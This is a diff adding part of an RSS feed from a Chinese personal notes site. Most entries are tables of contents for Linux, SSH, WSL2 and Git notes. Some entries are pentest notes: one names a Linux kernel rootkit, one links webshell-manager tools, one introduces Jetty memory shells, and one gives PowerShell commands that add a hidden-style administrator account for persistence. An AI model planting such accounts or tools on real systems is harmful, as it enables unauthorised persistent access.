+<li><a href="#%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C">分支操作</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%B8%AA%E6%96%87%E4%BB%B6%E5%8F%98%E5%8A%A8%E7%9A%84%E6%89%80%E6%9C%89%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95">查看某个文件变动的所有历史记录</a></li>
+<li><a href="#%E5%BC%BA%E5%88%B6%E6%8B%89%E5%8F%96%E8%BF%9C%E7%A8%8B%E6%9B%B4%E6%96%B0%E8%A6%86%E7%9B%96%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93">强制拉取远程更新覆盖本地仓库</a></li>
+<li><a href="#%E6%89%B9%E9%87%8F%E4%BF%AE%E6%94%B9%E6%8F%90%E4%BA%A4%E5%90%8D%E7%A7%B0%E4%B8%8E%E9%82%AE%E7%AE%B1">批量修改提交名称与邮箱</a></li>
+<li><a href="#submodule">Submodule</a></li>
+</ul>
+</li>
+<li><a href="#relations">relations</a>
+<ul>
+<li><a href="#code996">code996</a></li>
+</ul>
+</li>
+<li><a href="#learngitbranching">learnGitBranching</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a>
+<ul>
+<li><a href="#fatal-authentication-failed">fatal: Authentication failed</a></li>
+<li><a href="#filename-too-lang">filename too lang</a></li>
+<li><a href="#%E6%8B%89%E5%8F%96%E6%97%B6%E9%97%B4%E8%BF%87%E9%95%BF">拉取时间过长</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202310241547078.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Linux权限维持</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Linux.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Linux.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux权限维持</source>
+      <description>Linux权限维持
+Diamorphine
+
+m0nad/Diamorphine：适用于 Linux 内核 2.6.x/3.x/4.x/5.x/6.x（x86/x86_64 和 ARM64）的 LKM rootkit） --- m0nad/Diamorphine: LKM rootkit for Linux Kernels 2.6.x/3.x/4.x/...</description>
+      <pubDate>Wed, 25 Sep 2024 10:54:09 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>Diamorphine</h2>
+<blockquote>
+<p>[m0nad/Diamorphine：适用于 Linux 内核 2.6.x/3.x/4.x/5.x/6.x（x86/x86_64 和 ARM64）的 LKM rootkit）</p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409251811742.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Linux提权</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/Linux.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux提权</source>
+      <description>Linux提权</description>
+      <pubDate>Wed, 25 Sep 2024 10:53:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>提权</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">提权</source>
+      <description>提权</description>
+      <pubDate>Wed, 25 Sep 2024 10:53:27 GMT</pubDate>
+      <content:encoded><![CDATA[
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Linux 会话管理工具</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7.html</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux 会话管理工具</source>
+      <description>Linux 会话管理工具
+
+Linux 会话管理工具
+
+Zellij
+
+安装
+使用
+
+
+Screen 命令
+
+语法
+
+
+tmux
+
+基本用法
+常用流程
+会话管理
+
+新建会话
+分离会话
+接入会话
+kill会话
+切换会话
+重命名会话
+
+
+
+
+
+
+
+
+Zellij
+
+Zellij
+
+安装
+
+Linux Ubuntu 添加环境变量_FarryNiu 的博客-C...</description>
+      <pubDate>Tue, 24 Sep 2024 07:05:48 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#linux-%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7">Linux 会话管理工具</a>
+<ul>
+<li><a href="#zellij">Zellij</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8">使用</a></li>
+</ul>
+</li>
+<li><a href="#screen-%E5%91%BD%E4%BB%A4">Screen 命令</a>
+<ul>
+<li><a href="#%E8%AF%AD%E6%B3%95">语法</a></li>
+</ul>
+</li>
+<li><a href="#tmux">tmux</a>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">基本用法</a></li>
+<li><a href="#%E5%B8%B8%E7%94%A8%E6%B5%81%E7%A8%8B">常用流程</a></li>
+<li><a href="#%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86">会话管理</a>
+<ul>
+<li><a href="#%E6%96%B0%E5%BB%BA%E4%BC%9A%E8%AF%9D">新建会话</a></li>
+<li><a href="#%E5%88%86%E7%A6%BB%E4%BC%9A%E8%AF%9D">分离会话</a></li>
+<li><a href="#%E6%8E%A5%E5%85%A5%E4%BC%9A%E8%AF%9D">接入会话</a></li>
+<li><a href="#kill%E4%BC%9A%E8%AF%9D">kill会话</a></li>
+<li><a href="#%E5%88%87%E6%8D%A2%E4%BC%9A%E8%AF%9D">切换会话</a></li>
+<li><a href="#%E9%87%8D%E5%91%BD%E5%90%8D%E4%BC%9A%E8%AF%9D">重命名会话</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/img/202205041947326.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Linux服务器</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8.html</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/Linux%E6%9C%8D%E5%8A%A1%E5%99%A8.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux服务器</source>
+      <description>Linux服务器
+
+Linux服务器
+
+远程连接服务器
+
+remote-SSH
+
+
+文件下载
+腾讯云轻量
+
+内网 DNS
+使用密钥登录到 root 账户
+
+
+探针
+
+
+
+
+远程连接服务器
+
+remote-SSH
+先在控制台生成并绑定密钥(本地密钥妥善保管), 然后再重置 root 密码
+
+20211122113415 &amp;gt; 20211122113543
+...</description>
+      <pubDate>Tue, 24 Sep 2024 07:04:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#linux%E6%9C%8D%E5%8A%A1%E5%99%A8">Linux服务器</a>
+<ul>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E6%9C%8D%E5%8A%A1%E5%99%A8">远程连接服务器</a>
+<ul>
+<li><a href="#remote-ssh">remote-SSH</a></li>
+</ul>
+</li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">文件下载</a></li>
+<li><a href="#%E8%85%BE%E8%AE%AF%E4%BA%91%E8%BD%BB%E9%87%8F">腾讯云轻量</a>
+<ul>
+<li><a href="#%E5%86%85%E7%BD%91-dns">内网 DNS</a></li>
+<li><a href="#%E4%BD%BF%E7%94%A8%E5%AF%86%E9%92%A5%E7%99%BB%E5%BD%95%E5%88%B0-root-%E8%B4%A6%E6%88%B7">使用密钥登录到 root 账户</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8E%A2%E9%92%88">探针</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/img/20211122113415.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Linux 软件管理</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/Linux%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86.html</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/Linux%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux 软件管理</source>
+      <description>Linux 软件管理
+
+Linux 软件管理
+
+命令行安装
+查看软件安装位置
+软件包
+Firefox
+微信
+
+
+
+
+命令行安装
+如下三个命令是 Linux 系统中比较常见的用于安装软件的命令:
+
+apt-get：传统工具，稳定且功能强大，适合高级用户和脚本。
+apt：现代化的工具，推荐日常使用，特别是对于普通用户。
+aptitude：提供更高级的功能和...</description>
+      <pubDate>Tue, 24 Sep 2024 07:04:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#linux-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86">Linux 软件管理</a>
+<ul>
+<li><a href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%AE%89%E8%A3%85">命令行安装</a></li>
+<li><a href="#%E6%9F%A5%E7%9C%8B%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%E4%BD%8D%E7%BD%AE">查看软件安装位置</a></li>
+<li><a href="#%E8%BD%AF%E4%BB%B6%E5%8C%85">软件包</a></li>
+<li><a href="#firefox">Firefox</a></li>
+<li><a href="#%E5%BE%AE%E4%BF%A1">微信</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Linux SSH</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/SSH.html</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/SSH.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux SSH</source>
+      <description>Linux SSH
+
+Linux SSH
+
+概述
+VSCode: Remote-SSH
+MobaXterm
+WindTerm
+Terminus
+远程图形化界面的本地显示
+
+一些软件命令行启动的命令
+
+
+使用 SSH 做端口转发让服务器用本地的 clash 代理
+
+
+
+
+概述
+
+如何在 Ubuntu 20.04 启用 SSH-阿里云开发者社区 (aliy...</description>
+      <pubDate>Tue, 24 Sep 2024 07:04:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#linux-ssh">Linux SSH</a>
+<ul>
+<li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li>
+<li><a href="#vscode-remote-ssh">VSCode: Remote-SSH</a></li>
+<li><a href="#mobaxterm">MobaXterm</a></li>
+<li><a href="#windterm">WindTerm</a></li>
+<li><a href="#terminus">Terminus</a></li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%98%BE%E7%A4%BA">远程图形化界面的本地显示</a>
+<ul>
+<li><a href="#%E4%B8%80%E4%BA%9B%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8%E7%9A%84%E5%91%BD%E4%BB%A4">一些软件命令行启动的命令</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BD%BF%E7%94%A8-ssh-%E5%81%9A%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E8%AE%A9%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%94%A8%E6%9C%AC%E5%9C%B0%E7%9A%84-clash-%E4%BB%A3%E7%90%86">使用 SSH 做端口转发让服务器用本地的 clash 代理</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/img/202211100020293.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Linux Shell</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/Shell.html</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/Shell.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux Shell</source>
+      <description>Linux Shell
+
+Linux Shell
+
+概述
+获取系统信息
+类清屏
+
+
+清屏
+指针移到行尾
+
+修改时区和时间
+用户管理
+echo
+防火墙相关
+Cron 表达式
+
+各字段含义
+常用 Cron 表达式
+
+
+
+
+
+
+概述
+
+Bash 编程入门-1：Shell 与 Bash - 知乎 (zhihu.com)
+
+shell 是运行在终端中的文本互动程...</description>
+      <pubDate>Tue, 24 Sep 2024 07:04:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#linux-shell">Linux Shell</a>
+<ul>
+<li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li>
+<li><a href="#%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF">获取系统信息</a></li>
+<li><a href="#%E7%B1%BB%E6%B8%85%E5%B1%8F">类清屏</a></li>
+</ul>
+</li>
+<li><a href="#%E6%B8%85%E5%B1%8F">清屏</a></li>
+<li><a href="#%E6%8C%87%E9%92%88%E7%A7%BB%E5%88%B0%E8%A1%8C%E5%B0%BE">指针移到行尾</a>
+<ul>
+<li><a href="#%E4%BF%AE%E6%94%B9%E6%97%B6%E5%8C%BA%E5%92%8C%E6%97%B6%E9%97%B4">修改时区和时间</a></li>
+<li><a href="#%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86">用户管理</a></li>
+<li><a href="#echo">echo</a></li>
+<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99%E7%9B%B8%E5%85%B3">防火墙相关</a></li>
+<li><a href="#cron-%E8%A1%A8%E8%BE%BE%E5%BC%8F">Cron 表达式</a>
+<ul>
+<li><a href="#%E5%90%84%E5%AD%97%E6%AE%B5%E5%90%AB%E4%B9%89">各字段含义</a></li>
+<li><a href="#%E5%B8%B8%E7%94%A8-cron-%E8%A1%A8%E8%BE%BE%E5%BC%8F">常用 Cron 表达式</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/img/20211219065045.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Linux</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux</source>
+      <description>Linux
+
+Linux
+
+Ubuntu 的 source.list 文件
+
+换源
+
+
+根目录各目录含义
+文件操作
+
+计算文件占用空间
+查找文件
+计算目录下的文件数量
+
+
+压缩与解压
+
+zip
+gz
+tar.gz
+7z
+
+
+使用 root 登入 UI
+软硬链接
+常见问题
+
+the root filesystem require a manual fsc...</description>
+      <pubDate>Tue, 24 Sep 2024 07:04:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#linux">Linux</a>
+<ul>
+<li><a href="#ubuntu-%E7%9A%84-sourcelist-%E6%96%87%E4%BB%B6">Ubuntu 的 source.list 文件</a>
+<ul>
+<li><a href="#%E6%8D%A2%E6%BA%90">换源</a></li>
+</ul>
+</li>
+<li><a href="#%E6%A0%B9%E7%9B%AE%E5%BD%95%E5%90%84%E7%9B%AE%E5%BD%95%E5%90%AB%E4%B9%89">根目录各目录含义</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C">文件操作</a>
+<ul>
+<li><a href="#%E8%AE%A1%E7%AE%97%E6%96%87%E4%BB%B6%E5%8D%A0%E7%94%A8%E7%A9%BA%E9%97%B4">计算文件占用空间</a></li>
+<li><a href="#%E6%9F%A5%E6%89%BE%E6%96%87%E4%BB%B6">查找文件</a></li>
+<li><a href="#%E8%AE%A1%E7%AE%97%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%95%B0%E9%87%8F">计算目录下的文件数量</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8E%8B%E7%BC%A9%E4%B8%8E%E8%A7%A3%E5%8E%8B">压缩与解压</a>
+<ul>
+<li><a href="#zip">zip</a></li>
+<li><a href="#gz">gz</a></li>
+<li><a href="#targz">tar.gz</a></li>
+<li><a href="#7z">7z</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BD%BF%E7%94%A8-root-%E7%99%BB%E5%85%A5-ui">使用 root 登入 UI</a></li>
+<li><a href="#%E8%BD%AF%E7%A1%AC%E9%93%BE%E6%8E%A5">软硬链接</a></li>
+<li><a href="#%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98">常见问题</a>
+<ul>
+<li><a href="#the-root-filesystem-require-a-manual-fsck">the root filesystem require a manual fsck</a></li>
+<li>[E: dpkg was interrupted, you must manually run 'dpkg --configure -a' to correct the problem.](#e-dpkg-was-interrupted-you-must-manually-run-dpkg</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202309201508290.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Linux 网络配置</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.html</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Linux 网络配置</source>
+      <description>Linux 网络配置
+
+Linux 网络配置
+
+路由操作
+
+ip route
+route(deprecated)
+
+
+NetworkManager
+
+默认路由
+
+
+启用与禁用网卡
+IP 转换
+防火墙
+
+iptables
+
+添加规则
+
+
+
+
+代理
+
+
+
+
+路由操作
+ip route
+
+
+查看路由表
+
+
+添加一条路由
+
+
+删除一条路由
+
+
+查看某个目的的路...</description>
+      <pubDate>Tue, 24 Sep 2024 07:04:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#linux-%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE">Linux 网络配置</a>
+<ul>
+<li><a href="#%E8%B7%AF%E7%94%B1%E6%93%8D%E4%BD%9C">路由操作</a>
+<ul>
+<li><a href="#ip-route">ip route</a></li>
+<li><a href="#routedeprecated">route(deprecated)</a></li>
+</ul>
+</li>
+<li><a href="#networkmanager">NetworkManager</a>
+<ul>
+<li><a href="#%E9%BB%98%E8%AE%A4%E8%B7%AF%E7%94%B1">默认路由</a></li>
+</ul>
+</li>
+<li><a href="#%E5%90%AF%E7%94%A8%E4%B8%8E%E7%A6%81%E7%94%A8%E7%BD%91%E5%8D%A1">启用与禁用网卡</a></li>
+<li><a href="#ip-%E8%BD%AC%E6%8D%A2">IP 转换</a></li>
+<li><a href="#%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>
+<ul>
+<li><a href="#iptables">iptables</a>
+<ul>
+<li><a href="#%E6%B7%BB%E5%8A%A0%E8%A7%84%E5%88%99">添加规则</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%BB%A3%E7%90%86">代理</a></li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202310110940549.png" type="image/png"/>
+    </item>
+    <item>
+      <title>WSL2</title>
+      <link>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/WSL/WSL2.html</link>
+      <guid>https://233official.github.io/dailynotes/%E9%80%9A%E8%AF%86/Linux/WSL/WSL2.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">WSL2</source>
+      <description>WSL2
+
+WSL2
+
+安装
+卸载
+VSCode-ssh-remote
+端口映射
+WSL2 DNS 服务异常
+报错收集
+
+ssh 拒绝
+ping 的通 ip , ping 不通域名
+
+
+
+
+
+
+安装
+
+安装 WSL | Microsoft Learn
+旧版 WSL 的手动安装步骤 | Microsoft Learn
+win10 WSL2 问题解决 Ws...</description>
+      <pubDate>Tue, 24 Sep 2024 07:04:16 GMT</pubDate>
+      <content:encoded><![CDATA[
+<ul>
+<li><a href="#wsl2">WSL2</a>
+<ul>
+<li><a href="#%E5%AE%89%E8%A3%85">安装</a></li>
+<li><a href="#%E5%8D%B8%E8%BD%BD">卸载</a></li>
+<li><a href="#vscode-ssh-remote">VSCode-ssh-remote</a></li>
+<li><a href="#%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84">端口映射</a></li>
+<li><a href="#wsl2-dns-%E6%9C%8D%E5%8A%A1%E5%BC%82%E5%B8%B8">WSL2 DNS 服务异常</a></li>
+<li><a href="#%E6%8A%A5%E9%94%99%E6%94%B6%E9%9B%86">报错收集</a>
+<ul>
+<li><a href="#ssh-%E6%8B%92%E7%BB%9D">ssh 拒绝</a></li>
+<li><a href="#ping-%E7%9A%84%E9%80%9A-ip--ping-%E4%B8%8D%E9%80%9A%E5%9F%9F%E5%90%8D">ping 的通 ip , ping 不通域名</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/img/202211202310305.png" type="image/png"/>
+    </item>
+    <item>
+      <title>菜刀</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Webshell/Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/%E8%8F%9C%E5%88%80.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/Webshell/Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/%E8%8F%9C%E5%88%80.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">菜刀</source>
+      <description>菜刀
+没找到可信来源, 暂且给网页归个档:
+
+Chora10/Cknife: Cknife (github.com)
+admintony/BypassCaiDao: 过WAF菜刀 (github.com)
+raddyfiy/caidao-official-version: 中国菜刀官方版本，拒绝黑吃黑，来路清晰 (github.com)
+webshel...</description>
+      <pubDate>Fri, 20 Sep 2024 09:49:51 GMT</pubDate>
+      <content:encoded><![CDATA[
+<p>没找到可信来源, 暂且给网页归个档:</p>
+<ul>
+<li><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener noreferrer">Chora10/Cknife: Cknife (github.com)</a></li>
+<li><a href="https://github.com/admintony/BypassCaiDao" target="_blank" rel="noopener noreferrer">admintony/BypassCaiDao: 过WAF菜刀 (github.com)</a></li>
+<li><a href="https://github.com/raddyfiy/caidao-official-version" target="_blank" rel="noopener noreferrer">raddyfiy/caidao-official-version: 中国菜刀官方版本，拒绝黑吃黑，来路清晰 (github.com)</a></li>
+<li><a href="https://bbs.zkaq.cn/t/4901.html#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80" target="_blank" rel="noopener noreferrer">webshell管理工具（菜刀、蚁剑、冰蝎、Weevely）- Track 知识社区 - 掌控安全在线教育 - Powered by 掌控者 (zkaq.cn)</a></li>
+<li><a href="https://www.mad-coding.cn/2020/02/14/%E5%88%86%E6%9E%90%E8%8F%9C%E5%88%80%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/" target="_blank" rel="noopener noreferrer">分析菜刀及隐藏后门 | madcoding’s blog (mad-coding.cn)</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>Jetty内存马</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Jetty%E5%86%85%E5%AD%98%E9%A9%AC.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Java%E5%86%85%E5%AD%98%E9%A9%AC/Jetty%E5%86%85%E5%AD%98%E9%A9%AC.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Jetty内存马</source>
+      <description>Jetty内存马
+Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。
+Jetty 是一种...</description>
+      <pubDate>Thu, 19 Sep 2024 11:10:39 GMT</pubDate>
+      <content:encoded><![CDATA[
+<p>Eclipse Jetty 是一个轻量级、高度可扩展、基于 Java 的 Web 服务器和 Servlet 引擎。Jetty 的目标是以高容量、低延迟的方式支持 Web 协议（HTTP/1、HTTP/2、HTTP/3、WebSocket 等），从而提供最高性能，同时保持易用性和与多年 Servlet 开发的兼容性。</p>
+<p>Jetty 是一种现代的完全异步 Web 服务器，作为面向组件的技术有着悠久的历史，可以轻松嵌入到应用程序中，同时仍然为 Web 应用程序部署提供可靠的传统发行版。</p>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409181629820.png" type="image/png"/>
+    </item>
+    <item>
+      <title>Windows 权限维持</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Windows.html</link>
+      <guid>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/Windows.html</guid>
+      <source url="https://233official.github.io/dailynotes/rss.xml">Windows 权限维持</source>
+      <description>Windows 权限维持
+添加用户
+管理员模式启动 powershell
+
+添加一个普通用户:
+image-20240918134940882
+
+添加一个管理员用户:
+image-20240918141158082
+
+添加远程访问权限:
+image-20240918135704959</description>
+      <pubDate>Wed, 18 Sep 2024 06:31:01 GMT</pubDate>
+      <content:encoded><![CDATA[
+<h2>添加用户</h2>
+<p>管理员模式启动 powershell</p>
+<div class="language-powershell" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code><span class="token comment"># 新建一个名为 NewAdminUser 的本地标准用户(普通用户,无管理员权限)，密码为 Password123!</span>
+<span class="token function">New-LocalUser</span> <span class="token operator">-</span>Name <span class="token string">"NewAdminUser"</span> <span class="token operator">-</span>Password <span class="token punctuation">(</span><span class="token function">ConvertTo-SecureString</span> <span class="token string">"Password123!"</span> <span class="token operator">-</span>AsPlainText <span class="token operator">-</span>Force<span class="token punctuation">)</span> <span class="token operator">-</span>FullName <span class="token string">"New Admin User"</span> <span class="token operator">-</span>Description <span class="token string">"New local admin account"</span>
+<span class="token comment"># 将用户添加到管理员组</span>
+<span class="token function">Add-LocalGroupMember</span> <span class="token operator">-</span><span class="token function">Group</span> <span class="token string">"Administrators"</span> <span class="token operator">-</span>Member <span class="token string">"NewAdminUser"</span>
+<span class="token comment"># 验证用户是否已被添加到管理员组</span>
+<span class="token function">Get-LocalGroupMember</span> <span class="token operator">-</span><span class="token function">Group</span> <span class="token string">"Administrators"</span>
+
+<span class="token comment"># 删除用户</span>
+<span class="token function">Remove-LocalUser</span> <span class="token operator">-</span>Name <span class="token string">"NewAdminUser"</span>
+<span class="token comment"># 验证是否删除成功</span>
+<span class="token function">Get-LocalUser</span>
+</code></pre></div><blockquote>
+<p>添加一个普通用户:</p>
+<p><img src="http://cdn.ayusummer233.top/DailyNotes/202409181356489.png" alt="image-20240918134940882"></p>
+</blockquote>
+]]></content:encoded>
+      <enclosure url="http://cdn.ayusummer233.top/DailyNotes/202409181356489.png" type="image/png"/>
+    </item>
+    <item>
+      <title>权限维持</title>
+      <link>https://233official.github.io/dailynotes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</link>
